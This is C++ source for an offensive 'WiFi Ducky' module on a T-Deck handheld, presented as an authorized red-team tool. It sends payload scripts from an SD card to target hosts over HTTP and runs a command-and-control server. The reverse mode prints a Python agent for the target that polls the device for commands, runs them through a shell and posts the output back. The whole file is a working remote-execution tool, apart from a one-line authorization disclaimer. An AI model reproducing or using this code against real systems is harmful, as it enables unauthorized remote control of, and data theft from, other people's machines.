// Pisces Moon OS
// Copyright (C) 2026 Eric Becker / Fluid Fortune
// SPDX-License-Identifier: AGPL-3.0-or-later
//
// This program is free software: you can redistribute it
// and/or modify it under the terms of the GNU Affero General
// Public License as published by the Free Software Foundation,
// either version 3 of the License, or any later version.
//
// fluidfortune.com

/**
 * PISCES MOON OS — WIFI DUCKY v1.0
 * Network-based payload delivery for authorized red team testing.
 *
 * Delivery methods:
 *
 *   HTTP POST  — Send a payload (file or typed command) to an HTTP listener
 *                running on the target. Compatible with netcat listeners,
 *                Python http.server, and custom handlers.
 *
 *   HTTP GET   — Trigger a pre-staged script or endpoint on the target.
 *                Useful for testing web app command injection.
 *
 *   SSH EXEC   — Execute one or more commands on target via SSH.
 *                Requires LibSSH-ESP32 in lib_deps (see platformio.ini).
 *                Without the library, shows stub screen with instructions.
 *
 *   REVERSE    — T-Deck acts as a simple HTTP command server. The target
 *                (running a polling script) fetches commands, executes them,
 *                posts results back. Demonstrates C2 channel concept.
 *                T-Deck shows output in real time.
 *
 * Target config: /payloads/wifi_targets.json
 *   Format: [{"name":"TestBox","ip":"192.168.1.100","port":8080,"method":"POST","path":"/exec"}]
 *
 * USE ONLY ON SYSTEMS YOU OWN OR HAVE EXPLICIT AUTHORIZATION TO TEST.
 */

#include <Arduino.h>
#include <Arduino_GFX_Library.h>
#include <WiFi.h>
#include <WiFiClient.h>
#include <WebServer.h>
#include <HTTPClient.h>
#include <ArduinoJson.h>
#include "SdFat.h"
#include "touch.h"
#include "trackball.h"
#include "keyboard.h"
#include "theme.h"
#include "wifi_ducky.h"

extern Arduino_GFX *gfx;
extern SdFat sd;
extern volatile bool wifi_in_use;

// ─────────────────────────────────────────────
//  COLORS
// ─────────────────────────────────────────────
#define WD_BG     0x0000
#define WD_HDR    0x0010
#define WD_RED    0xF800
#define WD_ORANGE 0xFD20
#define WD_GREEN  0x07E0
#define WD_CYAN   0x07FF
#define WD_WHITE  0xFFFF
#define WD_DIM    0x4208
#define WD_SEL    0x0018

#define PAYLOAD_DIR   "/payloads"
#define TARGETS_FILE  "/payloads/wifi_targets.json"

// ─────────────────────────────────────────────
//  TARGET CONFIG
// ─────────────────────────────────────────────
#define MAX_TARGETS 8

struct WDTarget {
    char name[24];
    char ip[16];
    int  port;
    char method[8];   // "POST", "GET", "SSH", "REVERSE"
    char path[64];
    char user[24];    // For SSH
    char pass[24];    // For SSH (stored only in session, not logged)
};

static WDTarget wdTargets[MAX_TARGETS];
static int      wdTargetCount = 0;

static void wdLoadTargets() {
    wdTargetCount = 0;
    if (!sd.exists(TARGETS_FILE)) {
        // Write sample targets file
        if (!sd.exists(PAYLOAD_DIR)) sd.mkdir(PAYLOAD_DIR);
        FsFile f = sd.open(TARGETS_FILE, O_WRITE|O_CREAT|O_TRUNC);
        if (f) {
            f.print("[\n"
                "  {\"name\":\"Test HTTP\",\"ip\":\"192.168.1.100\",\"port\":8080,"
                "\"method\":\"POST\",\"path\":\"/exec\",\"user\":\"\",\"pass\":\"\"},\n"
                "  {\"name\":\"SSH Target\",\"ip\":\"192.168.1.101\",\"port\":22,"
                "\"method\":\"SSH\",\"path\":\"\",\"user\":\"user\",\"pass\":\"\"}\n"
                "]\n");
            f.close();
        }
    }

    FsFile f = sd.open(TARGETS_FILE, O_RDONLY);
    if (!f) return;
    uint32_t sz = f.fileSize();
    char* buf = (char*)ps_malloc(sz + 1);
    if (!buf) { f.close(); return; }
    f.read(buf, sz); buf[sz] = '\0'; f.close();

    DynamicJsonDocument doc(4096);
    if (deserializeJson(doc, buf) == DeserializationError::Ok) {
        for (JsonObject obj : doc.as<JsonArray>()) {
            if (wdTargetCount >= MAX_TARGETS) break;
            WDTarget& t = wdTargets[wdTargetCount++];
            strncpy(t.name,   obj["name"]   | "Unknown", 23);
            strncpy(t.ip,     obj["ip"]     | "0.0.0.0", 15);
            t.port = obj["port"] | 80;
            strncpy(t.method, obj["method"] | "POST",    7);
            strncpy(t.path,   obj["path"]   | "/",       63);
            strncpy(t.user,   obj["user"]   | "",        23);
            strncpy(t.pass,   obj["pass"]   | "",        23);
        }
    }
    free(buf);
}

// ─────────────────────────────────────────────
//  PAYLOAD FILE LIST
// ─────────────────────────────────────────────
#define MAX_PAYLOADS 16
static char wdPayloads[MAX_PAYLOADS][48];
static int  wdPayloadCount = 0;

static void wdScanPayloads() {
    wdPayloadCount = 0;
    if (!sd.exists(PAYLOAD_DIR)) return;
    FsFile dir = sd.open(PAYLOAD_DIR);
    if (!dir) return;
    FsFile f;
    while (f.openNext(&dir, O_RDONLY) && wdPayloadCount < MAX_PAYLOADS) {
        char nm[48]; f.getName(nm, sizeof(nm));
        if ((strstr(nm,".txt")||strstr(nm,".sh")||strstr(nm,".ps1")||strstr(nm,".cmd"))
            && strcmp(nm,"wifi_targets.json")!=0) {
            snprintf(wdPayloads[wdPayloadCount++], 48, "%s/%s", PAYLOAD_DIR, nm);
        }
        f.close();
    }
    dir.close();
}

// ─────────────────────────────────────────────
//  DELIVERY METHODS
// ─────────────────────────────────────────────

// Read payload file into PSRAM buffer — caller must free()
static char* wdReadPayload(const char* path, size_t* outLen) {
    FsFile f = sd.open(path, O_RDONLY);
    if (!f) { *outLen = 0; return nullptr; }
    *outLen = f.fileSize();
    char* buf = (char*)ps_malloc(*outLen + 1);
    if (!buf) { f.close(); *outLen = 0; return nullptr; }
    f.read(buf, *outLen);
    buf[*outLen] = '\0';
    f.close();
    return buf;
}

// Result display buffer
static char wdResult[512];

// HTTP POST — send payload as request body to target
static bool wdDeliverHTTPPOST(WDTarget& t, const char* payload, size_t payLen) {
    wifi_in_use = true;
    char url[96];
    snprintf(url, sizeof(url), "http://%s:%d%s", t.ip, t.port, t.path);

    HTTPClient http;
    http.begin(url);
    http.addHeader("Content-Type", "text/plain");
    http.setTimeout(5000);

    int code = http.POST((uint8_t*)payload, payLen);
    String resp = (code > 0) ? http.getString() : "";
    http.end();
    wifi_in_use = false;

    if (code > 0) {
        snprintf(wdResult, sizeof(wdResult), "HTTP %d: %s", code, resp.substring(0,200).c_str());
        return (code >= 200 && code < 300);
    } else {
        snprintf(wdResult, sizeof(wdResult), "Connection failed: %d", code);
        return false;
    }
}

// HTTP GET — trigger endpoint on target
static bool wdDeliverHTTPGET(WDTarget& t, const char* extraPath) {
    wifi_in_use = true;
    char url[128];
    snprintf(url, sizeof(url), "http://%s:%d%s%s",
             t.ip, t.port, t.path, extraPath ? extraPath : "");

    HTTPClient http;
    http.begin(url);
    http.setTimeout(5000);
    int code = http.GET();
    String resp = (code > 0) ? http.getString() : "";
    http.end();
    wifi_in_use = false;

    snprintf(wdResult, sizeof(wdResult), "HTTP GET %d: %s", code, resp.substring(0,200).c_str());
    return (code >= 200 && code < 300);
}

// SSH EXEC — execute commands via SSH (requires LibSSH-ESP32)
static bool wdDeliverSSH(WDTarget& t, const char* cmd) {
#ifdef LIBSSH_AVAILABLE
    // Full SSH implementation follows same pattern as ssh_client.cpp
    // Abbreviated here — see ssh_client.cpp for full session management
    snprintf(wdResult, sizeof(wdResult), "SSH exec not fully wired in this build.");
    return false;
#else
    snprintf(wdResult, sizeof(wdResult),
        "SSH requires LibSSH-ESP32.\n"
        "Add to lib_deps: https://github.com/ewpa/LibSSH-ESP32\n"
        "then add -DLIBSSH_AVAILABLE to build_flags.");
    return false;
#endif
}

// REVERSE — T-Deck acts as HTTP command server, target polls for commands
// Target-side agent (Python snippet shown on screen):
//   import requests, subprocess
//   while True:
//     r = requests.get('http://<TDECK_IP>/cmd')
//     if r.text.strip():
//       out = subprocess.check_output(r.text, shell=True, text=True)
//       requests.post('http://<TDECK_IP>/result', data=out)
//     time.sleep(2)

static WebServer wdRevServer(7070);
static String    wdPendingCmd  = "";
static String    wdLastResult  = "";
static bool      wdRevRunning  = false;
static volatile bool wdRevExit = false;

static void wdRevHandleCmd() {
    wdRevServer.send(200, "text/plain", wdPendingCmd);
    wdPendingCmd = "";  // Clear after serving once
}
static void wdRevHandleResult() {
    if (wdRevServer.method() == HTTP_POST) {
        wdLastResult = wdRevServer.arg("plain");
        wdRevServer.send(200, "text/plain", "OK");
    }
}
static void wdRevHandleRoot() {
    wdRevServer.send(200, "text/html",
        "<html><body><pre>Pisces Moon C2 Listener Active\n"
        "POST /cmd to set command\nGET /cmd to retrieve command\n"
        "POST /result with output body</pre></body></html>");
}

// ─────────────────────────────────────────────
//  DRAWING
// ─────────────────────────────────────────────
static void wdDrawHeader(const char* sub) {
    gfx->fillRect(0, 0, 320, 24, WD_HDR);
    gfx->drawFastHLine(0, 23, 320, WD_CYAN);
    gfx->setTextSize(1);
    gfx->setTextColor(WD_CYAN);
    gfx->setCursor(6, 4); gfx->print("WIFI DUCKY");
    gfx->setTextColor(WD_DIM);
    gfx->setCursor(6, 14); gfx->print(sub);
    gfx->setTextColor(WD_DIM);
    gfx->setCursor(264, 8); gfx->print("[Q=EXIT]");
}

static void wdDrawTargetList(int scroll, int selected) {
    gfx->fillRect(0, 26, 320, 172, WD_BG);
    gfx->setTextSize(1);
    gfx->setTextColor(WD_DIM);
    gfx->setCursor(4, 28);
    gfx->printf("TARGETS (%d)   Edit: %s", wdTargetCount, TARGETS_FILE);
    gfx->drawFastHLine(0, 37, 320, 0x0018);

    if (wdTargetCount == 0) {
        gfx->setTextColor(WD_DIM);
        gfx->setCursor(6, 70); gfx->print("No targets. Edit /payloads/wifi_targets.json");
        gfx->setCursor(6, 86); gfx->print("on SD card to add target hosts.");
        return;
    }

    int show = min(7, wdTargetCount);
    for (int i = scroll; i < scroll + show && i < wdTargetCount; i++) {
        WDTarget& t = wdTargets[i];
        int ry  = 40 + (i - scroll) * 22;
        bool sel = (i == selected);
        gfx->fillRect(0, ry, 320, 21, sel ? WD_SEL : (i%2==0 ? 0x0821 : WD_BG));

        gfx->setTextColor(sel ? WD_WHITE : 0xC618);
        gfx->setCursor(4, ry + 2); gfx->print(t.name);

        uint16_t mc = (strcmp(t.method,"POST")==0) ? WD_CYAN :
                      (strcmp(t.method,"GET")==0)  ? WD_GREEN :
                      (strcmp(t.method,"SSH")==0)  ? WD_ORANGE :
                                                     WD_RED;
        gfx->setTextColor(mc);
        gfx->setCursor(130, ry + 2); gfx->print(t.method);

        gfx->setTextColor(WD_DIM);
        gfx->setCursor(4, ry + 12);
        gfx->printf("%s:%d%s", t.ip, t.port, t.path);
    }
}

static void wdDrawPayloadList(int scroll, int selected) {
    gfx->fillRect(0, 26, 320, 172, WD_BG);
    gfx->setTextSize(1);
    gfx->setTextColor(WD_DIM);
    gfx->setCursor(4, 28); gfx->printf("PAYLOADS (%d)", wdPayloadCount);
    gfx->drawFastHLine(0, 37, 320, 0x0018);

    if (wdPayloadCount == 0) {
        gfx->setTextColor(WD_DIM);
        gfx->setCursor(6, 70); gfx->print("No payloads in /payloads/");
        return;
    }
    int show = min(7, wdPayloadCount);
    for (int i = scroll; i < scroll + show && i < wdPayloadCount; i++) {
        int ry = 40 + (i - scroll) * 20;
        bool sel = (i == selected);
        gfx->fillRect(0, ry, 320, 19, sel ? WD_SEL : (i%2==0 ? 0x0821 : WD_BG));
        const char* slash = strrchr(wdPayloads[i], '/');
        gfx->setTextColor(sel ? WD_ORANGE : 0xC618);
        gfx->setCursor(8, ry + 5);
        char nb[38]; strncpy(nb, slash ? slash+1 : wdPayloads[i], 37); nb[37]='\0';
        gfx->print(nb);
    }
}

static void wdShowResult(bool success) {
    gfx->fillRect(0, 26, 320, 172, WD_BG);
    gfx->setTextSize(1);
    gfx->setTextColor(success ? WD_GREEN : WD_RED);
    gfx->setCursor(4, 32);
    gfx->print(success ? "SUCCESS" : "FAILED");
    gfx->drawFastHLine(0, 42, 320, 0x0018);

    // Word-wrap result into display
    gfx->setTextColor(WD_DIM);
    int y = 48; int maxLines = 8;
    const char* p = wdResult;
    while (*p && maxLines > 0) {
        char line[54]; int i = 0;
        while (*p && *p != '\n' && i < 52) line[i++] = *p++;
        if (*p == '\n') p++;
        line[i] = '\0';
        gfx->setCursor(4, y); gfx->print(line);
        y += 12; maxLines--;
    }
}

static void wdDrawStatus(const char* msg, uint16_t col = WD_DIM) {
    gfx->fillRect(0, 210, 320, 30, 0x0008);
    gfx->drawFastHLine(0, 210, 320, WD_CYAN);
    gfx->setTextSize(1);
    gfx->setTextColor(col);
    gfx->setCursor(4, 220); gfx->print(msg);
}

// ─────────────────────────────────────────────
//  REVERSE C2 MODE
// ─────────────────────────────────────────────
static void wdRunReverse() {
    gfx->fillScreen(WD_BG);
    String ip = WiFi.localIP().toString();
    wdDrawHeader("REVERSE C2 LISTENER");

    gfx->setTextSize(1);
    gfx->setTextColor(WD_WHITE);
    gfx->setCursor(4, 32); gfx->print("T-Deck acting as C2 server.");
    gfx->setTextColor(WD_DIM);
    gfx->setCursor(4, 46); gfx->print("Target agent (Python):");
    gfx->setTextColor(WD_CYAN);
    gfx->setCursor(4, 58); gfx->printf("  URL: http://%s:7070/cmd", ip.c_str());

    gfx->setTextColor(0x4208);
    gfx->setCursor(4, 76);  gfx->print("import requests,subprocess,time");
    gfx->setCursor(4, 88);  gfx->print("while True:");
    gfx->setCursor(4, 100); gfx->printf("  r=requests.get('http://%s:7070/cmd')", ip.substring(0,14).c_str());
    gfx->setCursor(4, 112); gfx->print("  if r.text.strip():");
    gfx->setCursor(4, 124); gfx->print("    o=subprocess.check_output(r.text,shell=1,text=1)");
    gfx->setCursor(4, 136); gfx->printf("    requests.post('http://%s:7070/result',data=o)", ip.substring(0,14).c_str());
    gfx->setCursor(4, 148); gfx->print("  time.sleep(2)");

    gfx->drawFastHLine(0, 162, 320, 0x0018);
    gfx->setTextColor(WD_GREEN);
    gfx->setCursor(4, 168); gfx->print("Type command below. ENTER to send. Q=exit.");

    // Start HTTP server
    wdRevServer.on("/",      HTTP_GET,  wdRevHandleRoot);
    wdRevServer.on("/cmd",   HTTP_GET,  wdRevHandleCmd);
    wdRevServer.on("/result",HTTP_POST, wdRevHandleResult);
    wdRevServer.begin();
    wdPendingCmd = ""; wdLastResult = "";

    // Command input bar
    String cmd = "";
    int lastResultLen = 0;

    auto drawCmdBar = [&]() {
        gfx->fillRect(0, 182, 320, 28, 0x0008);
        gfx->drawFastHLine(0, 182, 320, WD_CYAN);
        gfx->setTextSize(1);
        gfx->setTextColor(WD_CYAN);
        gfx->setCursor(4, 192);
        gfx->printf("> %s_", cmd.substring(max(0,(int)cmd.length()-46)).c_str());
    };

    auto drawResult = [&]() {
        if (wdLastResult.length() == 0) return;
        gfx->fillRect(0, 212, 320, 28, 0x0008);
        gfx->drawFastHLine(0, 212, 320, WD_DIM);
        gfx->setTextColor(WD_GREEN); gfx->setTextSize(1);
        gfx->setCursor(4, 222);
        gfx->printf("OUT: %.48s", wdLastResult.substring(0,48).c_str());
    };

    drawCmdBar();

    while (true) {
        wdRevServer.handleClient();

        // Show new results
        if ((int)wdLastResult.length() != lastResultLen) {
            lastResultLen = wdLastResult.length();
            drawResult();
        }

        char k = get_keypress();
        int16_t tx, ty;
        if (get_touch(&tx, &ty) && ty < 24) { while(get_touch(&tx,&ty)){delay(10);} break; }
        if (k == 'q' || k == 'Q') break;

        if (k == 13 || k == 10) {
            // Send command
            wdPendingCmd = cmd;
            cmd = "";
            drawCmdBar();
        } else if ((k == 8 || k == 127) && cmd.length() > 0) {
            cmd.remove(cmd.length() - 1);
            drawCmdBar();
        } else if (k >= 32 && k < 127) {
            cmd += (char)k;
            drawCmdBar();
        }

        delay(5); yield();
    }

    wdRevServer.stop();
}

// ─────────────────────────────────────────────
//  MAIN ENTRY
// ─────────────────────────────────────────────
void run_wifi_ducky() {
    if (WiFi.status() != WL_CONNECTED) {
        gfx->fillScreen(WD_BG);
        wdDrawHeader("NOT CONNECTED");
        gfx->setTextColor(WD_RED); gfx->setTextSize(1);
        gfx->setCursor(6, 50); gfx->print("WiFi required. Connect via COMMS > WIFI JOIN.");
        gfx->setTextColor(WD_DIM); gfx->setCursor(6, 70);
        gfx->print("Tap header or Q to exit.");
        while (true) {
            int16_t tx, ty;
            if (get_touch(&tx, &ty) && ty < 24) { while(get_touch(&tx,&ty)){delay(10);} return; }
            if (get_keypress()) return;
            delay(50);
        }
    }

    wdLoadTargets();
    wdScanPayloads();

    // State machine: TARGET_SELECT → METHOD_CONFIRM → PAYLOAD_SELECT → RESULT
    // or REVERSE mode runs its own loop

    int tScroll = 0, tSel = 0;
    int pScroll = 0, pSel = 0;

    enum WDState { ST_TARGETS, ST_PAYLOADS, ST_RESULT };
    WDState state = ST_TARGETS;
    WDTarget* activeTgt = nullptr;

    gfx->fillScreen(WD_BG);
    wdDrawHeader("Select target");
    wdDrawTargetList(tScroll, tSel);
    wdDrawStatus("CLICK=select target  BALL=scroll  Q=exit", WD_DIM);

    while (true) {
        char k = get_keypress();
        TrackballState tb = update_trackball();
        int16_t tx, ty;

        if (get_touch(&tx, &ty) && ty < 24) {
            while(get_touch(&tx,&ty)){delay(10);}
            if (state != ST_TARGETS) {
                state = ST_TARGETS; activeTgt = nullptr;
                gfx->fillScreen(WD_BG);
                wdDrawHeader("Select target");
                wdDrawTargetList(tScroll, tSel);
                wdDrawStatus("CLICK=select target  BALL=scroll  Q=exit", WD_DIM);
            } else break;
            continue;
        }
        if (k == 'q' || k == 'Q') {
            if (state != ST_TARGETS) {
                state = ST_TARGETS; activeTgt = nullptr;
                gfx->fillScreen(WD_BG);
                wdDrawHeader("Select target");
                wdDrawTargetList(tScroll, tSel);
                wdDrawStatus("CLICK=select  BALL=scroll  Q=exit", WD_DIM);
            } else break;
            continue;
        }

        if (state == ST_TARGETS) {
            int maxS = max(0, wdTargetCount - 7);
            if (tb.y==-1&&tSel>0)              { tSel--; if(tSel<tScroll) tScroll--; }
            if (tb.y== 1&&tSel<wdTargetCount-1){ tSel++; if(tSel>=tScroll+7) tScroll++; }
            wdDrawTargetList(tScroll, tSel);

            if (tb.clicked && wdTargetCount > 0) {
                activeTgt = &wdTargets[tSel];

                if (strcmp(activeTgt->method, "REVERSE") == 0) {
                    wdRunReverse();
                    gfx->fillScreen(WD_BG);
                    wdDrawHeader("Select target");
                    wdDrawTargetList(tScroll, tSel);
                    wdDrawStatus("CLICK=select  BALL=scroll  Q=exit", WD_DIM);
                } else if (strcmp(activeTgt->method, "GET") == 0) {
                    // GET — no payload needed, fire immediately
                    wdDrawStatus("Sending GET request...", WD_ORANGE);
                    bool ok = wdDeliverHTTPGET(*activeTgt, nullptr);
                    state = ST_RESULT;
                    gfx->fillScreen(WD_BG);
                    wdDrawHeader(ok ? "SUCCESS" : "FAILED");
                    wdShowResult(ok);
                    wdDrawStatus("Tap header or Q to go back", ok ? WD_GREEN : WD_RED);
                } else {
                    // POST / SSH — need payload selection
                    state = ST_PAYLOADS;
                    pScroll = 0; pSel = 0;
                    gfx->fillScreen(WD_BG);
                    char sub[40]; snprintf(sub, sizeof(sub), "%s → %s", activeTgt->name, activeTgt->method);
                    wdDrawHeader(sub);
                    wdDrawPayloadList(pScroll, pSel);
                    wdDrawStatus("CLICK=send payload  BALL=scroll  Q=back", WD_DIM);
                }
            }

        } else if (state == ST_PAYLOADS) {
            int maxSp = max(0, wdPayloadCount - 7);
            if (tb.y==-1&&pSel>0)              { pSel--; if(pSel<pScroll) pScroll--; }
            if (tb.y== 1&&pSel<wdPayloadCount-1){ pSel++; if(pSel>=pScroll+7) pScroll++; }
            wdDrawPayloadList(pScroll, pSel);

            if (tb.clicked && wdPayloadCount > 0 && activeTgt) {
                wdDrawStatus("Loading payload...", WD_ORANGE);
                size_t payLen = 0;
                char* payload = wdReadPayload(wdPayloads[pSel], &payLen);

                bool ok = false;
                if (payload) {
                    wdDrawStatus("Delivering...", WD_ORANGE);
                    if (strcmp(activeTgt->method, "POST") == 0) {
                        ok = wdDeliverHTTPPOST(*activeTgt, payload, payLen);
                    } else if (strcmp(activeTgt->method, "SSH") == 0) {
                        ok = wdDeliverSSH(*activeTgt, payload);
                    } else {
                        snprintf(wdResult, sizeof(wdResult), "Unknown method: %s", activeTgt->method);
                    }
                    free(payload);
                } else {
                    snprintf(wdResult, sizeof(wdResult), "Failed to read payload file.");
                }

                state = ST_RESULT;
                gfx->fillScreen(WD_BG);
                wdDrawHeader(ok ? "DELIVERED" : "FAILED");
                wdShowResult(ok);
                wdDrawStatus("Tap header or Q to go back", ok ? WD_GREEN : WD_RED);
            }

        } else if (state == ST_RESULT) {
            // Any input goes back to target selection
            if (tb.clicked || tb.y || tb.x) {
                state = ST_TARGETS;
                activeTgt = nullptr;
                gfx->fillScreen(WD_BG);
                wdDrawHeader("Select target");
                wdDrawTargetList(tScroll, tSel);
                wdDrawStatus("CLICK=select  BALL=scroll  Q=exit", WD_DIM);
            }
        }

        delay(20); yield();
    }

    gfx->fillScreen(WD_BG);
}
